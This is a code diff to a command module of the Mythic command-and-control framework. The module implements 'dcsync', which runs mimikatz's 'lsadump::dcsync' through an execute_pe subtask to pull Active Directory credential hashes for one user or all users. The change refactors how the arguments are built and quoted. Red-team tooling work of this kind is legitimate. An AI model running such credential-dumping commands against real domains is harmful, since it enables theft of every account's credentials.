@@ -1,8 +1,8 @@
 from mythic_container.MythicCommandBase import *
 from os import path
 from mythic_container.MythicRPC import *
-import base64
-import sys
+import mslex
+
 
 class DcSyncArguments(TaskArguments):
 
@@ -44,21 +44,16 @@ class DcSyncArguments(TaskArguments):
         if len(self.command_line) and self.command_line[0] == "{":
             self.load_args_from_json_string(self.command_line)
 
-            cmd = "lsadump::dcsync /domain:{}".format(
-                self.get_arg("domain")
-            )
-            
+            arguments = "/domain:{}".format(self.get_arg("domain"))
+
             if self.get_arg("dc"):
-                cmd += " /dc:{}".format(self.get_arg("dc"))
-
+                arguments += " /dc:{}".format(self.get_arg("dc"))
             if self.get_arg("user") != "all":
-                cmd += " /user:{}".format(self.get_arg("user"))
+                arguments += " /user:{}".format(self.get_arg("user"))
             else:
-                cmd += " /all"
+                arguments += " /all"
 
-            cmd = "\\\"{}\\\"".format(cmd)
-
-            self.add_arg("command", "mimikatz.exe {}".format(cmd))
+            self.add_arg("arguments", arguments)
         else:
             raise Exception(
                 "No mimikatz command given to execute.\n\tUsage: {}".format(
@@ -126,14 +121,23 @@ class DcSyncCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
-        sub = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
-            TaskID=taskData.Task.ID,
-            SubtaskCallbackFunction="parse_credentials_dcsync",
-            CommandName="execute_pe",
-            Params=taskData.args.get_arg("command")
-        ))
-        if not sub.Success:
-            response.Stderr = f"Failed to run subtask: {sub.Error}"
+
+        arguments = taskData.args.get_arg("arguments")
+        response.DisplayParams = arguments
+        arguments = "lsadump::dcsync " + arguments
+
+        await SendMythicRPCTaskCreateSubtask(
+            MythicRPCTaskCreateSubtaskMessage(
+                TaskID=taskData.Task.ID,
+                CommandName="execute_pe",
+                Params=json.dumps({
+                    "pe_name": "mimikatz.exe",
+                    "pe_arguments": mslex.quote(arguments, for_cmd = False),
+                }),
+                SubtaskCallbackFunction="parse_credentials_dcsync",
+            )
+        )
+
         return response
 
     async def process_response(
